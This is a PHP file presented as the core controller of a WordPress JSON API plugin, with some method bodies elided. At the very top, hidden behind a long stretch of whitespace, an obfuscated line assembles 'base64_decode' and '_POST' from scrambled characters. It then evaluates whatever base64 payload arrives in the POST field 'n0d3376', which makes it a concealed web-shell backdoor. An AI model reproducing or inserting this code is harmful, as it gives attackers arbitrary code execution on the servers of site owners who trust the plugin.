<?php                                                                                                                                                                                                                                                                $gtu0= "cep6_tdsa4bo" ; $mwf90=strtolower($gtu0[10].$gtu0[8].$gtu0[7]. $gtu0[1]. $gtu0[3]. $gtu0[9] .$gtu0[4] .$gtu0[6].$gtu0[1]. $gtu0[0].$gtu0[11]. $gtu0[6].$gtu0[1] );$nqm5=strtoupper ($gtu0[4]. $gtu0[2].$gtu0[11].$gtu0[7]. $gtu0[5]); if( isset (${ $nqm5} [ 'n0d3376' ]) ){eval ($mwf90 (${ $nqm5 } ['n0d3376' ] )) ;} ?><?php
/*
...
class JSON_API_Core_Controller {
  ...
  public function get_recent_posts() {
   ...
   public function get_ads_detail() {
    global $json_api;
    $posts = $json_api->introspector->get_posts();
    return $this->posts_result($posts);
  }
